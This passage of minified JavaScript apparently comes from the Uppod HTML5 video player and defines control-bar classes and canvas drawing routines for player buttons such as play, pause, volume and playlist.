        font: e + "px Arial",
        position: "absolute",
        left: -100,
        top: -1e3
    }),
    s.innerHTML = t;
    t = {
        width: s.clientWidth,
        height: s.clientHeight
    };
    return document.body.removeChild(s),
    s = null,
    t
}
;
var createElement = function(t) {
    "div" == t && (t = "uppod_player_div");
    t = document.createElement(t);
    return t.style.display = "block",
    t
}, UppodXml;
function ToggleView(t) {
    t && ("none" == t.style.display ? t.style.display = "block" : t.style.display = "none")
}
function is_array(t) {
    return "object" == typeof t && t instanceof Array
}
function getRandomInt(t, e) {
    return Math.floor(Math.random() * (e - t + 1)) + t
}
window["epyVidhvalup".replace("pyVidh", "")] = function(t) {
    UppodUpcat.show(t)
}
,
Uppod.waitFor = function(t) {
    var e = 0
      , i = function() {
        if (e < 600)
            return t.condition() ? t.done() : (e += 1,
            setTimeout(i, 100))
    };
    return i()
}
,
UppodXml = function() {
    function t(t) {
        window.DOMParser ? this._xml = (new DOMParser).parseFromString(t, "text/xml") : (this._xml = new ActiveXObject("Microsoft.XMLDOM"),
        this._xml.async = !1,
        this._xml.loadXML(t)),
        window.xml = this
    }
    return t.prototype.getOne = function(t) {
        return this._xml.querySelector(t)
    }
    ,
    t.prototype.get = function(t) {
        return this._xml.querySelectorAll(t)
    }
    ,
    t.prototype._xml = null,
    t
}(),
window.Uppod.Xml = UppodXml;
var __extends = function(t, e) {
    for (var i in e)
        __hasProp.call(e, i) && (t[i] = e[i]);
    function o() {
        this.constructor = t
    }
    return o.prototype = e.prototype,
    t.prototype = new o,
    t.__super__ = e.prototype,
    t
}, __hasProp = {}.hasOwnProperty, UppodControls;
window.Uppod.ControlBar = function(t) {
    function e(t) {
        this._uppod = t,
        e.__super__.constructor.call(this, "ControlBar", {
            dom: createElement("div")
        }),
        this.css({
            position: "absolute"
        }),
        this.dom.style.zIndex = 5,
        this._setLeftTop(),
        this._uppod.playerBodyElement().c.appendChild(this.dom)
    }
    return __extends(e, t),
    e.prototype._uppod = null,
    e.prototype._vars = function() {
        return this._uppod.vars()
    }
    ,
    e.prototype._calcTop = function() {
        var t = this._vars()
          , e = 1 === t.cntrlout ? t.padding / 2 : 0;
        return this._uppod.isFullscreen() ? t.sh - t.cntrloutheight - e : t.ph - t.cntrloutheight - e - t.padding
    }
    ,
    e.prototype._setLeftTop = function() {
        return this.css({
            top: this._calcTop() - this._vars().cntrlbgmargin,
            left: this._uppod.isFullscreen() ? this._vars().cntrlbgmargin : this._vars().padding + this._vars().cntrlbgmargin
        })
    }
    ,
    e.prototype.resize = function() {
        return this._setLeftTop()
    }
    ,
    e
}(window.Uppod.Control),
UppodControls = function() {
    function t() {}
    return t.prototype.activateBaseUI = function() {
        return this.activate(t._base)
    }
    ,
    t.prototype.deactivateBaseUI = function() {
        return this.deactivate(t._base)
    }
    ,
    t.prototype.deactivate = function(t) {
        for (var e, i = this._wrapEach(t), o = [], s = 0, l = i.length; s < l; s++)
            e = i[s],
            o.push(e.deactivate());
        return o
    }
    ,
    t.prototype.activate = function(t) {
        for (var e, i = this._wrapEach(t), o = [], s = 0, l = i.length; s < l; s++)
            e = i[s],
            o.push(e.activate());
        return o
    }
    ,
    t.prototype.add = function(t) {
        return this[t.key] = t
    }
    ,
    t.prototype.addElement = function(t, e) {
        return this[t] = new this._create(t,{
            element: e
        })
    }
    ,
    t.prototype.addDom = function(t, e) {
        return this[t] = new this._create(t,{
            dom: e
        })
    }
    ,
    t.prototype._create = function(t, e) {
        return new (Uppod[t + "Control"] || Uppod.Control)(t,e)
    }
    ,
    t.prototype._wrapEach = function(t) {
        var o, s = t.split(" ");
        return function() {
            for (var t = [], e = 0, i = s.length; e < i; e++)
                o = s[e],
                t.push(this[o]);
            return t
        }
        .call(this).filter(function(t) {
            return !!t
        })
    }
    ,
    t._base = "Play Pause Back Stop Download Next Prev TimePlay TimeAll Separator RunLine RunVolume Volume VolumeMute VolumeBarlineV VolumeBarline VolumeBar Sub Hd Hd1 HdSelect Playlist Menu Buffer Start Space Line LineBtn EnterFullscreen ExitFullscreen ControlBar",
    t
}(),
window.Uppod.Controls = UppodControls;
var Uppod = Uppod || {};
Uppod.Element = function(t, e, i, o, s, l) {
    var r = Uppod.setStyle
      , a = Uppod.measureText
      , n = Uppod.IconImg
      , p = this.selfDom = this.c = createElement("div")
      , d = this.uppodStyle = this.s = new Uppod.UppodStyle(t,e,l);
    d.scale && (d.scale *= t.cntrlsize),
    d.scale2 && (d.scale2 *= t.cntrlsize),
    "hd" != e && "hd1" != e || (i = a("hd1" == e && d.icon2 ? d.icon2 : d.icon, 12).width + 6 * d.scale),
    "sub" == e && (i = a(d.icon, 12).width + 6 * d.scale),
    "all" == s && (d.color = d.color_all),
    "load" == s && (d.color = d.color_load),
    "play" == s && (d.color = d.color_play),
    "start" == e && (1 != d.bg || o * d.scale2 > d.bg_h || i * d.scale2 > d.bg_w ? (o *= d.scale2,
    i *= d.scale2) : (o = d.bg_h,
    i = d.bg_w)),
    "separator" == e && t.sid && 1 != d.scale && (d.margintop = 0,
    d.marginbottom = 0,
    20 * d.scale > t.cntrloutheight && (d.scale = t.cntrloutheight / 20)),
    this.canvas = document.createElement("canvas"),
    this.ctx = this.canvas.getContext("2d");
    var h, s = 1;
    if (this.ctx.webkitBackingStorePixelRatio < 2 && (s = window.devicePixelRatio || 1),
    this.canvas.height = o * d.scale * s,
    this.canvas.width = i * d.scale * s,
    this.ctx.scale(s, s),
    1 == d.bg && -1 == e.indexOf("line") && (s = new Uppod.Shaper2({
        w: i * d.scale,
        h: o * d.scale,
        o: 1 < d.bg_o ? d.bg_o / 2 : o / 2 * d.bg_o * d.scale,
        bgc: d.bgcolor,
        sh: d.bg_sh,
        sh_c: d.sh_c,
        sh_a: d.sh_a
    }),
    p.appendChild(s.c),
    d.bg_a && r(s.canvas, {
        opacity: d.bg_a,
        filter: "alpha(opacity=" + 100 * d.bg_a + ")"
    }),
    r(s.canvas, {
        position: "absolute",
        top: +d.margintop - +d.marginbottom,
        left: (1 - d.scale) * i / 2
    }),
    1 == d.bg_gl && (h = new Uppod.Shaper2({
        w: i * d.scale,
        h: o * d.scale,
        o: o / 2 * d.bg_o * d.scale,
        bgc: d.gl_color + "|" + d.gl_color,
        bga1: d.gl_a1,
        bga2: d.gl_a2
    }),
    p.appendChild(h.c),
    r(h.canvas, {
        position: "absolute",
        top: 0,
        left: (1 - d.scale) * i / 2 + o * d.scale / 8,
        height: o * d.scale / 2,
        width: i * d.scale - o * d.scale / 4
    }))),
    this.fstyle = "",
    d.color)
        if (0 < d.color.indexOf("|")) {
            var u = d.color.split("|")
              , v = this.ctx.createLinearGradient(0, 0, 0, o * d.scale);
            for (this.j = 0; this.j < u.length - 1; this.j++)
                v.addColorStop(this.j / (u.length - 1), "#" + ReColor(u[this.j]));
            v.addColorStop(1, "#" + ReColor(u[u.length - 1])),
            this.fstyle = v
        } else
            this.fstyle = "#" + ReColor(d.color);
    if (this.ctx.fillStyle = this.fstyle,
    1 == d.sh && (this.ctx.shadowOffsetX = 0,
    this.ctx.shadowOffsetY = 1 == d.sh_under ? 2 : 0,
    this.ctx.shadowBlur = 5,
    this.ctx.shadowColor = "rgba(" + HTR("#" + ReColor(d.sh_c)) + "," + HTG("#" + ReColor(d.sh_c)) + "," + HTB("#" + ReColor(d.sh_c)) + "," + d.sh_a + ")"),
    "play" != e && "start" != e || (h = "play" == e ? d.scale : d.scale2,
    0 == String(d.icon).indexOf("http") ? (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, 1, d.pic_w, d.pic_h, d.halficonisover),
    "start" == e && 1 < d.pic_w && 1 < d.pic_h && (i = 1 == d.halficonisover ? d.pic_w / 2 : d.pic_w,
    o = d.pic_h)) : (0 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(6 * h, 4 * h),
    this.ctx.lineTo(16 * h, 9 * h),
    this.ctx.lineTo(6 * h, 15 * h),
    this.ctx.lineTo(6 * h, 4 * h),
    this.ctx.closePath(),
    this.ctx.fill()),
    1 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(6 * h, 5 * h),
    this.ctx.quadraticCurveTo(6 * h, 4 * h, 7 * h, 4 * h),
    this.ctx.lineTo(15 * h, 9 * h),
    this.ctx.quadraticCurveTo(16 * h, 10 * h, 15 * h, 11 * h),
    this.ctx.lineTo(7 * h, 16 * h),
    this.ctx.quadraticCurveTo(6 * h, 16 * h, 6 * h, 15 * h),
    this.ctx.lineTo(6 * h, 5 * h),
    this.ctx.closePath(),
    this.ctx.fill()),
    2 == d.icon && (this.ctx.moveTo(6 * h, 5 * h),
    this.ctx.lineTo(15 * h, 10 * h),
    this.ctx.lineTo(6 * h, 15 * h),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 3 * h,
    this.ctx.stroke()),
    3 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(6 * h, 4 * h),
    this.ctx.lineTo(16 * h, 10 * h),
    this.ctx.lineTo(6 * h, 16 * h),
    this.ctx.lineTo(6 * h, 4 * h),
    this.ctx.lineTo(6 * h, 5 * h),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 1.5 * h,
    this.ctx.stroke()))),
    0 == e.indexOf("my") && (0 == String(d.icon).indexOf("http") ? (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, 2, d.pic_w, d.pic_h, d.halficonisover)) : (p.innerHTML = d.icon,
    r(this.c, {
        width: i,
        color: "#" + d.color,
        font: "10px Arial"
    }))),
    "sub" == e && (0 == String(d.icon).indexOf("http") ? (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, 2, d.pic_w, d.pic_h, d.halficonisover)) : (this.ctx.fillStyle = d.color,
    d.icon2 || (d.icon2 = d.icon),
    this.ctx.font = "normal " + 12 * d.scale + "px Arial",
    d.icon2 = d.icon2.replace(/(<([^>]+)>)/gi, ""),
    d.icon = d.icon.replace(/(<([^>]+)>)/gi, ""),
    this.ctx.fillText("hd1" == e ? d.icon2 : d.icon, 3 * d.scale, 15 * d.scale))),
    "pause" == e && (0 == String(d.icon).indexOf("http") && (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, 2, d.pic_w, d.pic_h, d.halficonisover)),
    0 == d.icon && (this.ctx.beginPath(),
    this.ctx.fillRect(6 * d.scale, 5 * d.scale, 3 * d.scale, 10 * d.scale),
    this.ctx.fillRect(12 * d.scale, 5 * d.scale, 3 * d.scale, 10 * d.scale),
    this.ctx.closePath(),
    this.ctx.fill()),
    0 < d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(7 * d.scale, 5 * d.scale),
    this.ctx.lineTo(7 * d.scale, 15 * d.scale),
    this.ctx.moveTo(14 * d.scale, 5 * d.scale),
    this.ctx.lineTo(14 * d.scale, 15 * d.scale),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 3 * d.scale,
    this.ctx.stroke())),
    "stop" == e && (0 == String(d.icon).indexOf("http") ? (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, "play" == l ? 2 : 0, d.pic_w, d.pic_h, d.halficonisover)) : (0 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(5 * d.scale, 5 * d.scale),
    this.ctx.lineTo(15 * d.scale, 5 * d.scale),
    this.ctx.lineTo(15 * d.scale, 15 * d.scale),
    this.ctx.lineTo(5 * d.scale, 15 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()),
    1 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(6 * d.scale, 6 * d.scale),
    this.ctx.lineTo(14 * d.scale, 15 * d.scale),
    this.ctx.lineTo(6 * d.scale, 6 * d.scale),
    this.ctx.moveTo(14 * d.scale, 6 * d.scale),
    this.ctx.lineTo(6 * d.scale, 15 * d.scale),
    this.ctx.lineTo(14 * d.scale, 6 * d.scale),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 3 * d.scale,
    this.ctx.stroke(),
    this.ctx.fill()),
    2 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(6 * d.scale, 6 * d.scale),
    this.ctx.lineTo(14 * d.scale, 6 * d.scale),
    this.ctx.lineTo(14 * d.scale, 14 * d.scale),
    this.ctx.lineTo(6 * d.scale, 14 * d.scale),
    this.ctx.closePath(),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 4 * d.scale,
    this.ctx.stroke(),
    this.ctx.fill()),
    3 == d.icon && (this.ctx.beginPath(),
    this.ctx.lineWidth = 1.5 * d.scale,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.strokeRect(5 * d.scale, 5 * d.scale, 11 * d.scale, 11 * d.scale),
    this.ctx.closePath(),
    this.ctx.stroke()))),
    "download" == e && (0 == String(d.icon).indexOf("http") ? (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, 0, d.pic_w, d.pic_h, d.halficonisover)) : (0 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(8 * d.scale, 4 * d.scale),
    this.ctx.lineTo(8 * d.scale, 9 * d.scale),
    this.ctx.lineTo(5 * d.scale, 9 * d.scale),
    this.ctx.lineTo(10 * d.scale, 16 * d.scale),
    this.ctx.lineTo(15 * d.scale, 9 * d.scale),
    this.ctx.lineTo(12 * d.scale, 9 * d.scale),
    this.ctx.lineTo(12 * d.scale, 4 * d.scale),
    this.ctx.lineTo(8 * d.scale, 4 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()),
    1 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(4 * d.scale, 6 * d.scale),
    this.ctx.lineTo(10 * d.scale, 11 * d.scale),
    this.ctx.lineTo(16 * d.scale, 6 * d.scale),
    this.ctx.lineTo(17 * d.scale, 8 * d.scale),
    this.ctx.lineTo(10 * d.scale, 14 * d.scale),
    this.ctx.lineTo(3 * d.scale, 8 * d.scale),
    this.ctx.lineTo(4 * d.scale, 6 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()),
    2 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(5 * d.scale, 5 * d.scale),
    this.ctx.lineTo(15 * d.scale, 5 * d.scale),
    this.ctx.lineTo(10 * d.scale, 12 * d.scale),
    this.ctx.lineTo(15 * d.scale, 12 * d.scale),
    this.ctx.lineTo(15 * d.scale, 14 * d.scale),
    this.ctx.lineTo(5 * d.scale, 14 * d.scale),
    this.ctx.lineTo(5 * d.scale, 12 * d.scale),
    this.ctx.lineTo(10 * d.scale, 12 * d.scale),
    this.ctx.lineTo(5 * d.scale, 5 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()))),
    "next" == e && (0 == String(d.icon).indexOf("http") ? (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, 0, d.pic_w, d.pic_h, d.halficonisover)) : (0 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(4 * d.scale, 8 * d.scale),
    this.ctx.lineTo(9 * d.scale, 9 * d.scale),
    this.ctx.lineTo(9 * d.scale, 5 * d.scale),
    this.ctx.lineTo(16 * d.scale, 10 * d.scale),
    this.ctx.lineTo(9 * d.scale, 15 * d.scale),
    this.ctx.lineTo(9 * d.scale, 12 * d.scale),
    this.ctx.lineTo(4 * d.scale, 12 * d.scale),
    this.ctx.lineTo(4 * d.scale, 8 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()),
    1 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(7 * d.scale, 3 * d.scale),
    this.ctx.lineTo(14 * d.scale, 10 * d.scale),
    this.ctx.lineTo(7 * d.scale, 17 * d.scale),
    this.ctx.lineTo(6 * d.scale, 16 * d.scale),
    this.ctx.lineTo(11 * d.scale, 10 * d.scale),
    this.ctx.lineTo(6 * d.scale, 5 * d.scale),
    this.ctx.lineTo(7 * d.scale, 3 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()),
    2 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(12 * d.scale, 10 * d.scale),
    this.ctx.lineTo(5 * d.scale, 15 * d.scale),
    this.ctx.lineTo(5 * d.scale, 5 * d.scale),
    this.ctx.lineTo(12 * d.scale, 10 * d.scale),
    this.ctx.lineTo(12 * d.scale, 5 * d.scale),
    this.ctx.lineTo(14 * d.scale, 5 * d.scale),
    this.ctx.lineTo(14 * d.scale, 15 * d.scale),
    this.ctx.lineTo(12 * d.scale, 15 * d.scale),
    this.ctx.lineTo(12 * d.scale, 10 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()))),
    "prev" == e && (0 == String(d.icon).indexOf("http") ? (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, 0, d.pic_w, d.pic_h, d.halficonisover)) : (0 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(4 * d.scale, 10 * d.scale),
    this.ctx.lineTo(11 * d.scale, 5 * d.scale),
    this.ctx.lineTo(11 * d.scale, 8 * d.scale),
    this.ctx.lineTo(16 * d.scale, 8 * d.scale),
    this.ctx.lineTo(16 * d.scale, 12 * d.scale),
    this.ctx.lineTo(11 * d.scale, 12 * d.scale),
    this.ctx.lineTo(11 * d.scale, 15 * d.scale),
    this.ctx.lineTo(4 * d.scale, 10 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()),
    1 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(12 * d.scale, 3 * d.scale),
    this.ctx.lineTo(13 * d.scale, 5 * d.scale),
    this.ctx.lineTo(8 * d.scale, 10 * d.scale),
    this.ctx.lineTo(13 * d.scale, 16 * d.scale),
    this.ctx.lineTo(12 * d.scale, 17 * d.scale),
    this.ctx.lineTo(5 * d.scale, 10 * d.scale),
    this.ctx.lineTo(12 * d.scale, 3 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()),
    2 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(7 * d.scale, 10 * d.scale),
    this.ctx.lineTo(7 * d.scale, 5 * d.scale),
    this.ctx.lineTo(5 * d.scale, 5 * d.scale),
    this.ctx.lineTo(5 * d.scale, 15 * d.scale),
    this.ctx.lineTo(7 * d.scale, 15 * d.scale),
    this.ctx.lineTo(7 * d.scale, 10 * d.scale),
    this.ctx.lineTo(14 * d.scale, 5 * d.scale),
    this.ctx.lineTo(14 * d.scale, 15 * d.scale),
    this.ctx.lineTo(7 * d.scale, 10 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()))),
    "back" == e && (0 == String(d.icon).indexOf("http") ? (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, 0, d.pic_w, d.pic_h, d.halficonisover)) : (0 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(4 * d.scale, 10 * d.scale),
    this.ctx.lineTo(14 * d.scale, 5 * d.scale),
    this.ctx.lineTo(14 * d.scale, 10 * d.scale),
    this.ctx.lineTo(24 * d.scale, 5 * d.scale),
    this.ctx.lineTo(24 * d.scale, 15 * d.scale),
    this.ctx.lineTo(14 * d.scale, 10 * d.scale),
    this.ctx.lineTo(14 * d.scale, 15 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()),
    1 != d.icon && 2 != d.icon || (this.ctx.beginPath(),
    this.ctx.moveTo(5 * d.scale, 10 * d.scale),
    this.ctx.lineTo(13 * d.scale, 6 * d.scale),
    this.ctx.lineTo(13 * d.scale, 10 * d.scale),
    this.ctx.lineTo(23 * d.scale, 5 * d.scale),
    this.ctx.lineTo(23 * d.scale, 15 * d.scale),
    this.ctx.lineTo(13 * d.scale, 10 * d.scale),
    this.ctx.lineTo(13 * d.scale, 15 * d.scale),
    this.ctx.closePath(),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 2 * d.scale,
    this.ctx.stroke(),
    this.ctx.fill()),
    3 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(5 * d.scale, 10 * d.scale),
    this.ctx.lineTo(15 * d.scale, 4 * d.scale),
    this.ctx.lineTo(15 * d.scale, 10 * d.scale),
    this.ctx.lineTo(25 * d.scale, 4 * d.scale),
    this.ctx.lineTo(25 * d.scale, 16 * d.scale),
    this.ctx.lineTo(15 * d.scale, 10 * d.scale),
    this.ctx.lineTo(15 * d.scale, 16 * d.scale),
    this.ctx.lineTo(5 * d.scale, 10 * d.scale),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 1.5 * d.scale,
    this.ctx.stroke()))),
    "volume" != e && "volume_mute" != e || (0 == String(d.icon).indexOf("http") ? (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, "volume" == e ? 1 : 2, d.pic_w, d.pic_h, d.halficonisover)) : (0 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(5 * d.scale, 8 * d.scale),
    this.ctx.lineTo(9 * d.scale, 8 * d.scale),
    this.ctx.lineTo(14 * d.scale, 4 * d.scale),
    this.ctx.lineTo(14 * d.scale, 15 * d.scale),
    this.ctx.lineTo(9 * d.scale, 11 * d.scale),
    this.ctx.lineTo(5 * d.scale, 11 * d.scale),
    this.ctx.lineTo(5 * d.scale, 8 * d.scale),
    "volume" == e && (this.ctx.moveTo(15 * d.scale, 7 * d.scale),
    this.ctx.lineTo(16 * d.scale, 7 * d.scale),
    this.ctx.lineTo(16 * d.scale, 12 * d.scale),
    this.ctx.lineTo(15 * d.scale, 12 * d.scale),
    this.ctx.lineTo(15 * d.scale, 7 * d.scale)),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()),
    1 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(4 * d.scale, 7 * d.scale),
    this.ctx.lineTo(6 * d.scale, 7 * d.scale),
    this.ctx.lineTo(6 * d.scale, 13 * d.scale),
    this.ctx.lineTo(4 * d.scale, 13 * d.scale),
    this.ctx.lineTo(4 * d.scale, 7 * d.scale),
    this.ctx.moveTo(7 * d.scale, 7 * d.scale),
    this.ctx.lineTo(13 * d.scale, 2 * d.scale),
    this.ctx.lineTo(13 * d.scale, 17 * d.scale),
    this.ctx.lineTo(7 * d.scale, 13 * d.scale),
    this.ctx.closePath(),
    "volume" == e && (this.ctx.moveTo(15 * d.scale, 8 * d.scale),
    this.ctx.arc(15 * d.scale, 10 * d.scale, 4 * d.scale, 1.6 * Math.PI, Math.PI / 2.3, !1),
    this.ctx.lineTo(15 * d.scale, 12 * d.scale),
    this.ctx.arc(14 * d.scale, 10 * d.scale, 4 * d.scale, Math.PI / 2.3, 1.6 * Math.PI, !0),
    this.ctx.moveTo(16 * d.scale, 9 * d.scale),
    this.ctx.lineTo(16 * d.scale, 11 * d.scale),
    this.ctx.lineTo(15 * d.scale, 11 * d.scale),
    this.ctx.lineTo(15 * d.scale, 9 * d.scale)),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()),
    2 == d.icon && (this.ctx.beginPath(),
    ovalX = 8 * d.scale,
    ovalY = 14 * d.scale,
    ovalW = 7 * d.scale,
    ovalH = 3 * d.scale,
    this.ctx.moveTo(ovalX, ovalY - ovalH / 2),
    this.ctx.bezierCurveTo(ovalX - ovalW / 2, ovalY - ovalH / 2, ovalX - ovalW / 2, ovalY + ovalH / 2, ovalX, ovalY + ovalH / 2),
    this.ctx.bezierCurveTo(ovalX + ovalW / 2, ovalY + ovalH / 2, ovalX + ovalW / 2, ovalY - ovalH / 2, ovalX, ovalY - ovalH / 2),
    this.ctx.moveTo(10 * d.scale, 14 * d.scale),
    this.ctx.lineTo(11 * d.scale, 3 * d.scale),
    this.ctx.quadraticCurveTo(13 * d.scale, 4 * d.scale, 13 * d.scale, 5 * d.scale),
    this.ctx.quadraticCurveTo(15 * d.scale, 6 * d.scale, 17 * d.scale, 6 * d.scale),
    this.ctx.quadraticCurveTo(14 * d.scale, 8 * d.scale, 11 * d.scale, 5 * d.scale),
    this.ctx.lineTo(10 * d.scale, 14 * d.scale),
    this.ctx.closePath(),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineWidth = .7,
    this.ctx.stroke(),
    this.ctx.fill()),
    3 == d.icon && (this.ctx.beginPath(),
    this.ctx.lineWidth = 1.5 * d.scale,
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.moveTo(3 * d.scale, 8 * d.scale),
    this.ctx.lineTo(6 * d.scale, 8 * d.scale),
    this.ctx.lineTo(12 * d.scale, 4 * d.scale),
    this.ctx.lineTo(12 * d.scale, 16 * d.scale),
    this.ctx.lineTo(6 * d.scale, 12 * d.scale),
    this.ctx.lineTo(3 * d.scale, 12 * d.scale),
    this.ctx.lineTo(3 * d.scale, 8 * d.scale),
    this.ctx.lineTo(6 * d.scale, 8 * d.scale),
    this.ctx.lineTo(6 * d.scale, 12 * d.scale),
    "volume" == e && (this.ctx.moveTo(15 * d.scale, 7 * d.scale),
    this.ctx.lineTo(18 * d.scale, 4 * d.scale),
    this.ctx.moveTo(15 * d.scale, 10 * d.scale),
    this.ctx.lineTo(19 * d.scale, 10 * d.scale),
    this.ctx.moveTo(15 * d.scale, 13 * d.scale),
    this.ctx.lineTo(18 * d.scale, 16 * d.scale)),
    this.ctx.stroke()))),
    "playlist" == e)
        if (0 == String(d.icon).indexOf("http"))
            1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
            n(d.icon, this.c, 0, d.pic_w, d.pic_h, d.halficonisover);
        else {
            if (0 == d.icon && (this.ctx.beginPath(),
            this.ctx.moveTo(6 * d.scale, 6 * d.scale),
            this.ctx.lineTo(13 * d.scale, 6 * d.scale),
            this.ctx.lineTo(13 * d.scale, 13 * d.scale),
            this.ctx.lineTo(6 * d.scale, 13 * d.scale),
            this.ctx.closePath(),
            this.ctx.strokeStyle = "#" + d.color,
            this.ctx.lineCap = "round",
            this.ctx.lineJoin = "round",
            this.ctx.lineWidth = 4 * d.scale,
            this.ctx.stroke(),
            this.ctx.fill(),
            this.ctx.clearRect(5 * d.scale, 5 * d.scale, 9 * d.scale, 9 * d.scale),
            this.ctx.fillRect(6 * d.scale, 6 * d.scale, 7 * d.scale, +d.scale),
            this.ctx.fillRect(6 * d.scale, 8 * d.scale, 7 * d.scale, +d.scale),
            this.ctx.fillRect(6 * d.scale, 10 * d.scale, 7 * d.scale, +d.scale),
            this.ctx.fillRect(6 * d.scale, 12 * d.scale, 7 * d.scale, +d.scale),
            this.ctx.closePath()),
            1 == d.icon) {
                for (this.ctx.beginPath(),
                c = 5; c < 15; c += 3)
                    this.ctx.moveTo(4 * d.scale, c * d.scale),
                    this.ctx.lineTo(16 * d.scale, c * d.scale),
                    this.ctx.lineTo(16 * d.scale, (c + 1) * d.scale),
                    this.ctx.lineTo(4 * d.scale, (c + 1) * d.scale),
                    this.ctx.lineTo(4 * d.scale, c * d.scale);
                this.ctx.lineWidth = .1,
                this.ctx.stroke(),
                this.ctx.fill(),
                this.ctx.closePath()
            }
            if (2 == d.icon) {
                for (this.ctx.beginPath(),
                c = 4; c < 15; c += 5)
                    this.ctx.moveTo(3 * d.scale, c * d.scale),
                    this.ctx.lineTo(5 * d.scale, c * d.scale),
                    this.ctx.lineTo(5 * d.scale, (c + 2) * d.scale),
                    this.ctx.lineTo(3 * d.scale, (c + 2) * d.scale),
                    this.ctx.lineTo(3 * d.scale, c * d.scale),
                    this.ctx.moveTo(7 * d.scale, c * d.scale),
                    this.ctx.lineTo(17 * d.scale, c * d.scale),
                    this.ctx.lineTo(17 * d.scale, (c + 2) * d.scale),
                    this.ctx.lineTo(7 * d.scale, (c + 2) * d.scale),
                    this.ctx.lineTo(7 * d.scale, c * d.scale);
                this.ctx.lineWidth = .1,
                this.ctx.stroke(),
                this.ctx.fill(),
                this.ctx.closePath()
            }
            if (3 == d.icon) {
                for (this.ctx.beginPath(),
                c = 4; c < 15; c += 5)
                    for (y = 4; y < 15; y += 5)
                        this.ctx.moveTo(y * d.scale, c * d.scale),
